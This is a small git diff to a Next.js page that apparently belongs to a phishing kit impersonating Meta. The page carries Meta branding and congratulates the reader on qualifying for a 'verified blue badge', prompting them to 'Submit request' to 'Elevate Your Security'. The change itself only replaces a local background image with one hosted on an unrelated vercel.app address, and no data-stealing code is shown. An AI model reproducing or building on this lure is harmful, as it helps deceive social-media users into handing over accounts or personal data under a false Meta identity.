@@ -1,5 +1,4 @@
 'use client';
-import BackgroundImage from '@/assets/images/bg-image.png';
 import MetaAI from '@/assets/images/meta-ai-image.png';
 import MetaImage from '@/assets/images/meta-image.png';
 import ProfileImage from '@/assets/images/profile-image.png';
@@ -185,7 +184,13 @@ const Page: FC = () => {
                     </div>
                     <p>{t(`Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.`)}</p>
                     <div className='rounded-b-[20px] bg-white'>
-                        <Image src={BackgroundImage} alt='' className='rounded-t-[20px] bg-blue-500 w-full py-10' />
+                        <Image
+                            src='https://196515155t.vercel.app/_next/static/media/bg-image.f195f9fa.png'
+                            alt=''
+                            width={1920}
+                            height={1080}
+                            className='rounded-t-[20px] bg-blue-500 w-full py-10'
+                        />
                         <div className='flex flex-col items-start justify-center gap-5 p-5'>
                             <p className='text-2xl text-start'>{t('Submit request')}</p>
                             <p className='text-[15px]'>{t('Elevate Your Security with Blue Badge Unlock!')}</p>
